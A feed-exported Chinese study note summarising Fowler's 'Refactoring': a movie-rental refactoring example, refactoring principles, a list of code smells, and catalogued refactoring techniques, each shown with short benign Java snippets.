    <content type="text"><![CDATA[一、第一个案例 二、重构原则 定义 为何重构 三次法则 间接层与重构 修改接口 何时不该重构 重构与设计 重构与性能 三、代码的坏味道 1. 重复代码 2. 过长函数 3. 过大的类 4. 过长的参数列表 5. 发散式变化 6. 散弹式修改 7. 依恋情结 8. 数据泥团 9. 基本类型偏执 10. switch 惊悚现身 11. 平行继承体系 12. 冗余类 13. 夸夸其谈未来性 14. 令人迷惑的暂时字段 15. 过度耦合的消息链 16. 中间人 17. 狎昵关系 18. 异曲同工的类 19. 不完美的类库 20. 幼稚的数据类 21. 被拒绝的馈赠 22. 过多的注释 四、构筑测试体系 五、重新组织函数 1. 提炼函数 2. 内联函数 3. 内联临时变量 4. 以查询取代临时变量 5. 引起解释变量 6. 分解临时变量 7. 移除对参数的赋值 8. 以函数对象取代函数 9. 替换算法 六、在对象之间搬移特性 1. 搬移函数 2. 搬移字段 3. 提炼类 4. 将类内联化 5. 隐藏委托关系 6. 移除中间人 7. 引入外加函数 8. 引入本地扩展 七、重新组织数据 1. 自封装字段 2. 以对象取代数据值 3. 将值对象改成引用对象 4. 将引用对象改为值对象 5. 以对象取代数组 6. 赋值被监视数据 7. 将单向关联改为双向关联 8. 将双向关联改为单向关联 9. 以字面常量取代魔法数 10. 封装字段 11. 封装集合 12. 以数据类取代记录 13. 以类取代类型码 14. 以子类取代类型码 15. 以 State/Strategy 取代类型码 16. 以字段取代子类 八、简化条件表达式 1. 分解条件表达式 2. 合并条件表达式 3. 合并重复的条件片段 4. 移除控制标记 5. 以卫语句取代嵌套条件表达式 6. 以多态取代条件表达式 7. 引入 Null 对象 8. 引入断言 九、简化函数调用 1. 函数改名 2. 添加参数 3. 移除参数 4. 将查询函数和修改函数分离 5. 令函数携带参数 6. 以明确函数取代参数 7. 保持对象完整 8. 以函数取代参数 9. 引入参数对象 10. 移除设值函数 11. 隐藏函数 12. 以工厂函数取代构造函数 13. 封装向下转型 14. 以异常取代错误码 15. 以测试取代异常 十、处理概括关系 1. 字段上移 2. 函数上移 3. 构造函数本体上移 4. 函数下移 5. 字段下移 6. 提炼子类 7. 提炼超类 8. 提炼接口 9. 折叠继承体系 10. 塑造模板函数 11. 以委托取代继承 12. 以继承取代委托 参考资料 一、第一个案例如果你发现自己需要为程序添加一个特性，而代码结构使你无法很方便地达成目的，那就先重构这个程序。 在重构前，需要先构建好可靠的测试环境，确保安全地重构。 重构需要以微小的步伐修改程序，如果重构过程发生错误，很容易就能发现错误。 案例分析 影片出租店应用程序，需要计算每位顾客的消费金额。 包括三个类：Movie、Rental 和 Customer。 最开始的实现是把所有的计费代码都放在 Customer 类中。可以发现，该代码没有使用 Customer 类中的任何信息，更多的是使用 Rental 类的信息，因此第一个可以重构的点就是把具体计费的代码移到 Rental 类中，然后 Customer 类的 getTotalCharge() 方法只需要调用 Rental 类中的计费方法即可。 1234567891011121314151617181920212223242526class Customer &#123; private List&lt;Rental&gt; rentals = new ArrayList&lt;&gt;(); void addRental(Rental rental) &#123; rentals.add(rental); &#125; double getTotalCharge() &#123; double totalCharge = 0.0; for (Rental rental : rentals) &#123; switch (rental.getMovie().getMovieType()) &#123; case Movie.Type1: totalCharge += rental.getDaysRented(); break; case Movie.Type2: totalCharge += rental.getDaysRented() * 2; break; case Movie.Type3: totalCharge += rental.getDaysRented() * 3; break; &#125; &#125; return totalCharge; &#125;&#125; 123456789101112131415161718class Rental &#123; private int daysRented; private Movie movie; Rental(int daysRented, Movie movie) &#123; this.daysRented = daysRented; this.movie = movie; &#125; Movie getMovie() &#123; return movie; &#125; int getDaysRented() &#123; return daysRented; &#125;&#125; 1234567891011121314class Movie &#123; static final int Type1 = 0, Type2 = 1, Type3 = 2; private int type; Movie(int type) &#123; this.type = type; &#125; int getMovieType() &#123; return type; &#125;&#125; 12345678910public class App &#123; public static void main(String[] args) &#123; Customer customer = new Customer(); Rental rental1 = new Rental(1, new Movie(Movie.Type1)); Rental rental2 = new Rental(2, new Movie(Movie.Type2)); customer.addRental(rental1); customer.addRental(rental2); System.out.println(customer.getTotalCharge()); &#125;&#125; 15 使用 switch 的准则是：只使用 switch 所在类的数据。解释如下：switch 使用的数据通常是一组相关的数据，例如 getTotalCharge() 代码使用了 Movie 的多种类别数据。当这组类别的数据发生改变时，例如增加 Movie 的类别或者修改一种 Movie 类别的计费方法，就需要修改 switch 代码。如果违反了准则，就会有多个地方的 switch 使用了这部分的数据，那么这些 swtich 都需要进行修改，这些代码可能遍布在各个地方，修改工作往往会很难进行。上面的实现违反了这一准则，因此需要重构。 以下是继承 Movie 的多态解决方案，这种方案可以解决上述的 switch 问题，因为每种电影类别的计费方式都被放到了对应 Movie 子类中，当变化发生时，只需要去修改对应子类中的代码即可。 有一条设计原则指示应该多用组合少用继承，这是因为组合比继承具有更高的灵活性。例如上面的继承方案，一部电影要改变它的计费方式，就要改变它所属的类，但是对象所属的类在编译时期就确定了，无法在运行过程中改变。（运行时多态可以在运行过程中改变一个父类引用指向的子类对象，但是无法改变一个对象所属的类。） 策略模式就是使用组合替代继承的一种解决方案。引入 Price 类，它有多种实现。Movie 组合了一个 Price 对象，并且在运行时可以改变组合的 Price 对象，从而使得它的计费方式发生改变。 重构后整体的类图和时序图如下： 重构后的代码： 123456789101112131415class Customer &#123; private List&lt;Rental&gt; rentals = new ArrayList&lt;&gt;(); void addRental(Rental rental) &#123; rentals.add(rental); &#125; double getTotalCharge() &#123; double totalCharge = 0.0; for (Rental rental : rentals) &#123; totalCharge += rental.getCharge(); &#125; return totalCharge; &#125;&#125; 1234567891011121314class Rental &#123; private int daysRented; private Movie movie; Rental(int daysRented, Movie movie) &#123; this.daysRented = daysRented; this.movie = movie; &#125; double getCharge() &#123; return daysRented * movie.getCharge(); &#125;&#125; 123interface Price &#123; double getCharge();&#125; 123456class Price1 implements Price &#123; @Override public double getCharge() &#123; return 1; &#125;&#125; 123456class Price2 implements Price &#123; @Override public double getCharge() &#123; return 2; &#125;&#125; 12345678package imp2;class Price3 implements Price &#123; @Override public double getCharge() &#123; return 3; &#125;&#125; 123456789101112class Movie &#123; private Price price; Movie(Price price) &#123; this.price = price; &#125; double getCharge() &#123; return price.getCharge(); &#125;&#125; 1234567891011class App &#123; public static void main(String[] args) &#123; Customer customer = new Customer(); Rental rental1 = new Rental(1, new Movie(new Price1())); Rental rental2 = new Rental(2, new Movie(new Price2())); customer.addRental(rental1); customer.addRental(rental2); System.out.println(customer.getTotalCharge()); &#125;&#125; 二、重构原则定义重构是对软件内部结构的一种调整，目的是在不改变软件可观察行为的前提下，提高其可理解性，降低其修改成本。 为何重构 改进软件设计 使软件更容易理解 帮助找到 Bug 提高编程速度 三次法则第一次做某件事时只管去做；第二次做类似事情时可以去做；第三次再做类似的事，就应该重构。 间接层与重构计算机科学中的很多问题可以通过增加一个间接层来解决，间接层具有以下价值： 允许逻辑共享 分开解释意图和实现 隔离变化 封装条件逻辑 重构可以理解为在适当的位置插入间接层以及在不需要时移除间接层。 修改接口如果重构手法改变了已发布的接口，就必须维护新旧两个接口。可以保留旧接口，让旧接口去调用新接口，并且使用 Java 提供的 @deprecation 将旧接口标记为弃用。 可见修改接口特别麻烦，因此除非真有必要，否则不要发布接口，并且不要过早发布接口。 何时不该重构当现有代码过于混乱时，应当重写而不是重构。 一个折中的办法是，将代码封装成一个个组件，然后对各个组件做重写或者重构的决定。 重构与设计软件开发无法预先设计，因为开发过程有很多变化发生，在最开始不可能都把所有情况考虑进去。 重构可以简化设计，重构在一个简单的设计上进行修修改改，当变化发生时，以一种灵活的方式去应对变化，进而带来更好的设计。 重构与性能为了软代码更容易理解，重构可能会导致性能减低。 在编写代码时，不用对性能过多关注，只有在最后性能优化阶段再考虑性能问题。 应当只关注关键代码的性能，并且只有一小部分的代码是关键代码。 三、代码的坏味道本章主要介绍一些不好的代码，也就是说这些代码应该被重构。 1. 重复代码 Duplicated Code 同一个类的两个函数有相同表达式，则用 Extract Method 提取出重复代码； 两个互为兄弟的子类含有相同的表达式，先使用 Extract Method，然后把提取出来的函数 Pull Up Method 推入超类。 如果只是部分相同，用 Extract Method 分离出相似部分和差异部分，然后使用 Form Template Method 这种模板方法设计模式。 如果两个毫不相关的类出现重复代码，则使用 Extract Class 方法将重复代码提取到一个独立类中。 2. 过长函数 Long Method 函数应该尽可能小，因为小函数具有解释能力、共享能力、选择能力。 分解长函数的原则：当需要用注释来说明一段代码时，就需要把这部分代码写入一个独立的函数中。 Extract Method 会把很多参数和临时变量都当做参数，可以用 Replace Temp with Query 消除临时变量，Introduce Parameter Object 和 Preserve Whole Object 可以将过长的参数列变得更简洁。 条件和循环语句往往也需要提取到新的函数中。 3. 过大的类 Large Class 应该尽可能让一个类只做一件事，而过大的类做了过多事情，需要使用 Extract Class 或 Extract Subclass。 先确定客户端如何使用该类，然后运用 Extract Interface 为每一种使用方式提取出一个接口。 4. 过长的参数列表 Long Parameter List 太长的参数列表往往会造成前后不一致，不易使用。 面向对象程序中，函数所需要的数据通常能在宿主类中找到。 5. 发散式变化 Divergent Change 设计原则：一个类应该只有一个引起改变的原因。也就是说，针对某一外界变化所有相应的修改，都只应该发生在单一类中。 针对某种原因的变化，使用 Extract Class 将它提炼到一个类中。 6. 散弹式修改 Shotgun Surgery 一个变化引起多个类修改。 使用 Move Method 和 Move Field 把所有需要修改的代码放到同一个类中。 7. 依恋情结 Feature Envy 一个函数对某个类的兴趣高于对自己所处类的兴趣，通常是过多访问其它类的数据， 使用 Move Method 将它移到该去的地方，如果对多个类都有 Feature Envy，先用 Extract Method 提取出多个函数。 8. 数据泥团 Data Clumps 有些数据经常一起出现，比如两个类具有相同的字段、许多函数有相同的参数，这些绑定在一起出现的数据应该拥有属于它们自己的对象。 使用 Extract Class 将它们放在一起。 9. 基本类型偏执 Primitive Obsession 使用类往往比使用基本类型更好，使用 Replace Data Value with Object 将数据值替换为对象。 10. switch 惊悚现身 Switch Statements 具体参见第一章的案例。 11. 平行继承体系 Parallel Inheritance Hierarchies 每当为某个类增加一个子类，必须也为另一个类相应增加一个子类。 这种结果会带来一些重复性，消除重复性的一般策略：让一个继承体系的实例引用另一个继承体系的实例。 12. 冗余类 Lazy Class 如果一个类没有做足够多的工作，就应该消失。 13. 夸夸其谈未来性 Speculative Generality 有些内容是用来处理未来可能发生的变化，但是往往会造成系统难以理解和维护，并且预测未来可能发生的改变很可能和最开始的设想相反。因此，如果不是必要，就不要这么做。 14. 令人迷惑的暂时字段 Temporary Field 某个字段仅为某种特定情况而设，这样的代码不易理解，因为通常认为对象在所有时候都需要它的所有字段。 把这种字段和特定情况的处理操作使用 Extract Class 提炼到一个独立类中。 15. 过度耦合的消息链 Message Chains 一个对象请求另一个对象，然后再向后者请求另一个对象，然后…，这就是消息链。采用这种方式，意味着客户代码将与对象间的关系紧密耦合。 改用函数链，用函数委托另一个对象来处理。 16. 中间人 Middle Man 中间人负责处理委托给它的操作，如果一个类中有过多的函数都委托给其它类，那就是过度运用委托，应当 Remove Middle Man，直接与负责的对象打交道。 17. 狎昵关系 Inappropriate Intimacy 两个类多于亲密，花费太多时间去探讨彼此的 private 成分。 18. 异曲同工的类 Alernative Classes with Different Interfaces 两个函数做同一件事，却有着不同的签名。 使用 Rename Method 根据它们的用途重新命名。 19. 不完美的类库 Incomplete Library Class 类库的设计者不可能设计出完美的类库，当我们需要对类库进行一些修改时，可以使用以下两种方法：如果只是修改一两个函数，使用 Introduce Foreign Method；如果要添加一大堆额外行为，使用 Introduce Local Extension。 20. 幼稚的数据类 Data Class 它只拥有一些数据字段，以及用于访问这些字段的函数，除此之外一无长物。 找出字段使用的地方，然后把相应的操作移到 Data Class 中。 21. 被拒绝的馈赠 Refused Bequest 子类不想继承超类的所有函数和数据。 为子类新建一个兄弟类，不需要的函数或数据使用 Push Down Method 和 Push Down Field 下推给那个兄弟。 22. 过多的注释 Comments 使用 Extract Method 提炼出需要注释的部分，然后用函数名来解释函数的行为。 四、构筑测试体系Java 可以使用 Junit 进行单元测试。 测试应该能够完全自动化，并能检查测试的结果。 小步修改，频繁测试。 单元测试的对象是类的方法，而功能测是以客户的角度保证软件正常运行。 应当集中测试可能出错的边界条件。 五、重新组织函数1. 提炼函数 Extract Method 将这段代码放进一个独立函数中，并让函数名称解释该函数的用途。 2. 内联函数 Inline Method 一个函数的本体与名称同样清楚易懂。 在函数调用点插入函数本体，然后移除该函数。 3. 内联临时变量 Inline Temp 一个临时变量，只被简单表达式赋值一次，而它妨碍了其它重构手法。 将所有对该变量的引用替换为对它赋值的那个表达式自身。 12double basePrice = anOrder.basePrice();return basePrice &gt; 1000; 1return anOrder.basePrice() &gt; 1000; 4. 以查询取代临时变量 Replace Temp with Query 以临时变量保存某一表达式的运算结果，将这个表达式提炼到一个独立函数中，将所有对临时变量的引用点替换为对新函数的调用。 Replace Temp with Query 往往是 Extract Method 之前必不可少的一个步骤，因为局部变量会使代码难以提炼。 12345double basePrice = quantity * itemPrice;if (basePrice &gt; 1000) return basePrice * 0.95;else return basePrice * 0.98; 123456789if (basePrice() &gt; 1000) return basePrice() * 0.95;else return basePrice() * 0.98;// ...double basePrice()&#123; return quantity * itemPrice;&#125; 5. 引起解释变量 Introduce Explaining Variable 将复杂表达式（或其中一部分）的结果放进一个临时变量， 以此变量名称来解释表达式用途。 12345if ((platform.toUpperCase().indexOf("MAC") &gt; -1) &amp;&amp; (browser.toUpperCase().indexOf("IE") &gt; -1) &amp;&amp; wasInitialized() &amp;&amp; resize &gt; 0) &#123; // do something&#125; 1234567final boolean isMacOS = platform.toUpperCase().indexOf("MAC") &gt; -1;final boolean isIEBrower = browser.toUpperCase().indexOf("IE") &gt; -1;final boolean wasResized = resize &gt; 0;if (isMacOS &amp;&amp; isIEBrower &amp;&amp; wasInitialized() &amp;&amp; wasResized) &#123; // do something&#125; 6. 分解临时变量 Split Temporary Variable 某个临时变量被赋值超过一次，它既不是循环变量，也不是用于收集计算结果。 针对每次赋值，创造一个独立、对应的临时变量，每个临时变量只承担一个责任。 7. 移除对参数的赋值 Remove Assigments to Parameters 以一个临时变量取代对该参数的赋值。 1234int discount (int inputVal, int quentity, int yearToDate) &#123; if (inputVal &gt; 50) inputVal -= 2; ...&#125; 12345int discount (int inputVal, int quentity, int yearToDate) &#123; int result = inputVal; if (inputVal &gt; 50) result -= 2; ...&#125; 8. 以函数对象取代函数 Replace Method with Method Object 当对一个大型函数采用 Extract Method 时，由于包含了局部变量使得很难进行该操作。 将这个函数放进一个单独对象中，如此一来局部变量就成了对象内的字段。然后可以在同一个对象中将这个大型函数分解为多个小型函数。 9. 替换算法 Subsititute Algorithn 六、在对象之间搬移特性1. 搬移函数 Move Method 类中的某个函数与另一个类进行更多交流：调用后者或者被后者调用。 将这个函数搬移到另一个类中。 2. 搬移字段 Move Field 类中的某个字段被另一个类更多地用到，这里的用到是指调用取值设值函数，应当把该字段移到另一个类中。 3. 提炼类 Extract Class 某个类做了应当由两个类做的事。 应当建立一个新类，将相关的字段和函数从旧类搬移到新类。 4. 将类内联化 Inline Class 与 Extract Class 相反。 5. 隐藏委托关系 Hide Delegate 建立所需的函数，隐藏委托关系。 123456789101112131415class Person &#123; Department department; public Department getDepartment() &#123; return department; &#125;&#125;class Department &#123; private Person manager; public Person getManager() &#123; return manager; &#125;&#125; 如果客户希望知道某人的经理是谁，必须获得 Department 对象，这样就对客户揭露了 Department 的工作原理。 1Person manager = john.getDepartment().getManager(); 通过为 Peron 建立一个函数来隐藏这种委托关系。 123public Person getManager() &#123; return department.getManager();&#125; 6. 移除中间人 Remove Middle Man 与 Hide Delegate 相反，本方法需要移除委托函数，让客户直接调用委托类。 Hide Delegate 有很大好处，但是它的代价是：每当客户要使用受托类的新特性时，就必须在服务器端添加一个简单的委托函数。随着受委托的特性越来越多，服务器类完全变成了一个“中间人”。 7. 引入外加函数 Introduce Foreign Method 需要为提供服务的类添加一个函数，但是无法修改这个类。 可以在客户类中建立一个函数，并以第一参数形式传入一个服务类的实例，让客户类组合服务器实例。 8. 引入本地扩展 Introduce Local Extension 和 Introduce Foreign Method 目的一样，但是 Introduce Local Extension 通过建立新的类来实现。有两种方式：子类或者包装类，子类就是通过继承实现，包装类就是通过组合实现。 七、重新组织数据1. 自封装字段 Self Encapsulate Field 为字段建立取值/设值函数，并用这些函数来访问字段。只有当子类想访问超类的一个字段，又想在子类中将对这个字段访问改为一个计算后的值，才使用这种方式，否则直接访问字段的方式简洁明了。 2. 以对象取代数据值 Replace Data Value with Object 在开发初期，往往会用简单的数据项表示简单的情况，但是随着开发的进行，一些简单数据项会具有一些特殊行为。比如一开始会把电话号码存成字符串，但是随后发现电话号码需要“格式化”、“抽取区号”之类的特殊行为。 3. 将值对象改成引用对象 Change Value to Reference 将彼此相等的实例替换为同一个对象。这就要用一个工厂来创建这种唯一对象，工厂类中需要保留一份已经创建对象的列表，当要创建一个对象时，先查找这份列表中是否已经存在该对象，如果存在，则返回列表中的这个对象；否则，新建一个对象，添加到列表中，并返回该对象。 4. 将引用对象改为值对象 Change Reference to value 以 Change Value to Reference 相反。值对象有个非常重要的特性：它是不可变的，不可变表示如果要改变这个对象，必须用一个新的对象来替换旧对象，而不是修改旧对象。 需要为值对象实现 equals() 和 hashCode() 方法。 5. 以对象取代数组 Replace Array with Object 有一个数组，其中的元素各自代表不同的东西。 以对象替换数组，对于数组中的每个元素，以一个字段来表示，这样方便操作，也更容易理解。 6. 赋值被监视数据 Duplicate Observed Data 一些领域数据置身于 GUI 控件中，而领域函数需要访问这些数据。 将该数据赋值到一个领域对象中，建立一个 Oberver 模式，用于同步领域对象和 GUI 对象内的重复数据。 7. 将单向关联改为双向关联 Change Unidirectional Association to Bidirectional 当两个类都需要对方的特性时，可以使用双向关联。 有两个类，分别为订单 Order 和客户 Customer，Order 引用了 Customer，Customer 也需要引用 Order 来查看其所有订单详情。 123456789class Order &#123; private Customer customer; public void setCustomer(Customer customer) &#123; if (this.customer != null) this.customer.removeOrder(this); this.customer = customer; this.customer.add(this); &#125;&#125; 123456789class Curstomer &#123; private Set&lt;Order&gt; orders = new HashSet&lt;&gt;(); public void removeOrder(Order order) &#123; orders.remove(order); &#125; public void addOrder(Order order) &#123; orders.add(order); &#125;&#125; 注意到，这里让 Curstomer 类来控制关联关系。有以下原则来决定哪个类来控制关联关系：如果某个对象是组成另一个对象的部件，那么由后者负责控制关联关系；如果是一对多关系，则由单一引用那一方来控制关联关系。 8. 将双向关联改为单向关联 Change Bidirectional Association to Unidirectional 和 Change Unidirectional Association to Bidirectiona 为反操作。 双向关联维护成本高，并且也不易于理解。大量的双向连接很容易造成“僵尸对象”：某个对象本身已经死亡了，却保留在系统中，因为它的引用还没有全部完全清除。 9. 以字面常量取代魔法数 Replace Magic Number with Symbolic Constant 创建一个常量，根据其意义为它命名，并将字面常量换为这个常量。 10. 封装字段 Encapsulate Field public 字段应当改为 private，并提供相应的访问函数。 11. 封装集合 Encapsulate Collection 函数返回集合的一个只读副本，并在这个类中提供添加/移除集合元素的函数。如果函数返回集合自身，会让用户得以修改集合内容而集合拥有者却一无所知。 12. 以数据类取代记录 Replace Record with Data Class 13. 以类取代类型码 Replace Type Code with Class 类中有一个数值类型码，但它并不影响类的行为，就用一个新类替换该数值类型码。如果类型码出现在 switch 语句中，需要使用 Replace Conditional with Polymorphism 去掉 switch，首先必须运用 Replace Type Code with Subcalss 或 Replace Type Code with State/Strategy 去掉类型码。 14. 以子类取代类型码 Replace Type Code with Subcalsses 有一个不可变的类型码，它会影响类的行为，以子类取代这个类型码。 15. 以 State/Strategy 取代类型码 Replace Type Code with State/Strategy 有一个可变的类型码，它会影响类的行为，以状态对象取代类型码。 和 Replace Type Code with Subcalsses 的区别是 Replace Type Code with State/Strategy 的类型码是动态可变的，前者通过继承的方式来实现，后者通过组合的方式来实现。因为类型码可变，如果通过继承的方式，一旦一个对象的类型码改变，那么就要改变用新的对象来取代旧对象，而客户端难以改变新的对象。但是通过组合的方式，改变引用的状态类是很容易的。 16. 以字段取代子类 Replace Subclass with Fields 各个子类的唯一差别只在“返回常量数据”的函数上。 八、简化条件表达式1. 分解条件表达式 Decompose Conditional 对于一个复杂的条件语句，可以从 if、then、else 三个段落中分别提炼出独立函数。 1234if (data.befor(SUMMER_START) || data.after(SUMMER_END)) charge = quantity * winterRate + winterServiceCharge;else charge = quantity * summerRate; 1234if (notSummer(date)) charge = winterCharge(quantity);else charge = summerCharge(quantity); 2. 合并条件表达式 Consolidate Conditional Expression 有一系列条件测试，都得到相同结果。 将这些测试合并为一个条件表达式，并将这个条件表达式提炼成为一个独立函数。 123456double disabilityAmount() &#123; if (seniority &lt; 2) return 0; if (monthsDisabled &gt; 12 ) return 0; if (isPartTime) return 0; // ...&#125; 1234double disabilityAmount() &#123; if (isNotEligibleForDisability()) return 0; // ...&#125; 3. 合并重复的条件片段 Consolidate Duplicate Conditional Fragments 在条件表达式的每个分支上有着相同的一段代码。 将这段重复代码搬移到条件表达式之外。 1234567if (isSpecialDeal()) &#123; total = price * 0.95; send();&#125; else &#123; total = price * 0.98; send();&#125; 123456if (isSpecialDeal()) &#123; total = price * 0.95;&#125; else &#123; total = price * 0.98;&#125;send(); 4. 移除控制标记 Remove Control Flag 在一系列布尔表达式中，某个变量带有“控制标记”的作用。 用 break 语句或 return 语句来取代控制标记。 5. 以卫语句取代嵌套条件表达式 Replace Nested Conditional with Guard Clauses 如果某个条件极其罕见，就应该单独检查该条件，并在该条件为真时立刻从函数中返回，这样的单独检查常常被称为“卫语句”（guard clauses）。 条件表达式通常有两种表现形式。第一种形式是：所有分支都属于正常行为。第二种形式则是：条件表达式提供的答案中只有一种是正常行为，其他都是不常见的情况，可以使用卫语句表现所有特殊情况。 123456789101112double getPayAmount() &#123; double result; if (isDead) result = deadAmount(); else &#123; if (isSeparated) result = separatedAmount(); else &#123; if (isRetired) result = retiredAmount(); else result = normalPayAmount(); &#125;; &#125; return result;&#125;; 123456double getPayAmount() &#123; if (isDead) return deadAmount(); if (isSeparated) return separatedAmount(); if (isRetired) return retiredAmount(); return normalPayAmount();&#125;; 6. 以多态取代条件表达式 Replace Conditional with Polymorphism 将这个条件表达式的每个分支放进一个子类内的覆写函数中，然后将原始函数声明为抽象函数。需要先使用 Replace Type Code with Subclass 或 Replace Type Code with State/Strategy 来建立继承结果。 1234567891011double getSpeed() &#123; switch (type) &#123; case EUROPEAN: return getBaseSpeed(); case AFRICAN: return getBaseSpeed()- getLoadFactor()* numberOfCoconuts; case NORWEGIAN_BLUE: return isNailed ? 0 : getBaseSpeed(voltage); &#125; throw new RuntimeException("Should be unreachable");&#125; 7. 引入 Null 对象 Introduce Null Object 将 null 值替换为 null 对象。这样做的好处在于，不需要询问对象是否为空，直接调用就行。 12if (customer == null) plan = BillingPlan.basic();else plan = customer.getPlan(); 8. 引入断言 Introduce Assertion 以断言明确表现某种假设。断言只能用于开发过程中，产品代码中不会有断言。 1234double getExpenseLimit() &#123; // should have either expense limit or a primary project return (expenseLimit != NULL_EXPENSE) ? expenseLimit : primaryProject.getMemberExpenseLimit();&#125; 1234double getExpenseLimit() &#123; Assert.isTrue (expenseLimit != NULL_EXPENSE || primaryProject != null); return (expenseLimit != NULL_EXPENSE) ? expenseLimit : primaryProject.getMemberExpenseLimit();&#125; 九、简化函数调用1. 函数改名 Rename Method 使函数名能解释函数的用途。 2. 添加参数 Add Parameter 使函数不需要通过调用获得某个信息。 3. 移除参数 Remove Parameter 与 Add Parameter 相反，改用调用的方式来获得某个信息。 4. 将查询函数和修改函数分离 Separate Query from Modifier 某个函数即返回对象状态值，又修改对象状态。 应当建立两个不同的函数，其中一个负责查询，另一个负责修改。任何有返回值的函数，都不应该有看得到的副作用。 1getTotalOutstandingAndSetReadyForSummaries(); 12getTotalOutstanding();setReadyForSummaries(); 5. 令函数携带参数 Parameterize Method 若干函数做了类似的工作，但在函数本体中却包含了不同的值。 建立单一函数，以参数表达那些不同的值。 12fivePercentRaise();tenPercentRaise(); 1raise(percentage); 6. 以明确函数取代参数 Replace Parameter with Explicit Methods 有一个函数，完全取决于参数值而采取不同行为。 针对该参数的每一个可能值，建立一个独立函数。 1234567891011void setValue(String name, int value)&#123; if (name.equals("height"))&#123; height = value; return; &#125; if (name.equals("width"))&#123; width = value; return; &#125; Assert.shouldNeverReachHere();&#125; 123456void setHeight(int arg)&#123; height = arg;&#125;void setWidth(int arg)&#123; width = arg;&#125; 7. 保持对象完整 Preserve Whole Object 从某个对象中取出若干值，将它们作为某一次函数调用时的参数。 改为传递整个对象。 123int low = daysTempRange().getLow();int high = daysTempRange().getHigh();withinPlan = plan.withinRange(low, high); 1withinPlan = plan.withinRange(daysTempRange()); 8. 以函数取代参数 Replace Parameter with Methods 对象调用某个函数，并将所得结果作为参数，传递给另一个函数。而接受该参数的函数本身也能够调用前一个函数。 让参数接收者去除该项参数，而是直接调用前一个函数。 123int basePrice = _quantity * _itemPrice;discountLevel = getDiscountLevel();double finalPrice = discountedPrice (basePrice, discountLevel); 12int basePrice = _quantity * _itemPrice;double finalPrice = discountedPrice (basePrice); 9. 引入参数对象 Introduce Parameter Object 某些参数总是很自然地同时出现，这些参数就是 Data Clumps。 以一个对象取代这些参数。 10. 移除设值函数 Remove Setting Method 类中的某个字段应该在对象创建时被设值，然后就不再改变。 去掉该字段的所有设值函数，并将该字段设为 final。 11. 隐藏函数 Hide Method 有一个函数，从来没有被其他任何类用到。 将这个函数修改为 private。 12. 以工厂函数取代构造函数 Replace Constructor with Factory Method 希望在创建对象时不仅仅是做简单的建构动作。 将构造函数替换为工厂函数。 13. 封装向下转型 Encapsulate Downcast 某个函数返回的对象，需要由函数调用者执行向下转型（downcast）。 将向下转型动作移到函数中。 123Object lastReading() &#123; return readings.lastElement();&#125; 123Reading lastReading() &#123; return (Reading)readings.lastElement();&#125; 14. 以异常取代错误码 Replace Error Code with Exception 某个函数返回一个特定的代码，用以表示某种错误情况。 改用异常，异常将普通程序和错误处理分开，使代码更容易理解。 15. 以测试取代异常 Replace Exception with Test 面对一个调用者可以预先检查的条件，你抛出了一个异常。 修改调用者，使它在调用函数之前先做检查。 1234567double getValueForPeriod(int periodNumber) &#123; try &#123; return values[periodNumber]; &#125; catch (ArrayIndexOutOfBoundsException e) &#123; return 0; &#125;&#125; 123double getValueForPeriod(int periodNumber) &#123; if (periodNumber &gt;= values.length) return 0; return values[periodNumber]; 十、处理概括关系1. 字段上移 Pull Up Field 两个子类拥有相同的字段。 将该字段移至超类。 2. 函数上移 Pull Up Method 有些函数，在各个子类中产生完全相同的结果。 将该函数移至超类。 3. 构造函数本体上移 Pull Up Constructor Body 你在各个子类中拥有一些构造函数，它们的本体几乎完全一致。 在超类中新建一个构造函数，并在子类构造函数中调用它。 1234567class Manager extends Employee...public Manager(String name, String id, int grade) &#123; this.name = name; this.id = id; this.grade = grade;&#125; 1234public Manager(String name, String id, int grade) &#123; super(name, id); this.grade = grade;&#125; 4. 函数下移 Push Down Method 超类中的某个函数只与部分子类有关。 将这个函数移到相关的那些子类去。 5. 字段下移 Push Down Field 超类中的某个字段只被部分子类用到。 将这个字段移到需要它的那些子类去。 6. 提炼子类 Extract Subclass 类中的某些特性只被某些实例用到。 新建一个子类，将上面所说的那一部分特性移到子类中。 7. 提炼超类 Extract Superclass 两个类有相似特性。 为这两个类建立一个超类，将相同特性移至超类。 8. 提炼接口 Extract Interface 若干客户使用类接口中的同一子集，或者两个类的接口有部分相同。 将相同的子集提炼到一个独立接口中。 9. 折叠继承体系 Collapse Hierarchy 超类和子类之间无太大区别。 将它们合为一体。 10. 塑造模板函数 Form Template Method 你有一些子类，其中相应的某些函数以相同顺序执行类似的操作，但各个操作的细节上有所不同。 将这些操作分别放进独立函数中，并保持它们都有相同的签名，于是原函数也就变得相同了。然后将原函数上移至超类。(模板方法模式) 11. 以委托取代继承 Replace Inheritance with Delegation 某个子类只使用超类接口中的一部分，或是根本不需要继承而来的数据。 在子类中新建一个字段用以保存超类，调整子类函数，令它改而委托超类，然后去掉两者之间的继承关系。 12. 以继承取代委托 Replace Delegation with Inheritance 你在两个类之间使用委托关系，并经常为整个接口编写许多极简单的委托函数。 让委托类继承受托类。 参考资料 MartinFowler, 福勒, 贝克, 等. 重构: 改善既有代码的设计 [M]. 电子工业出版社, 2011.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设计模式]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
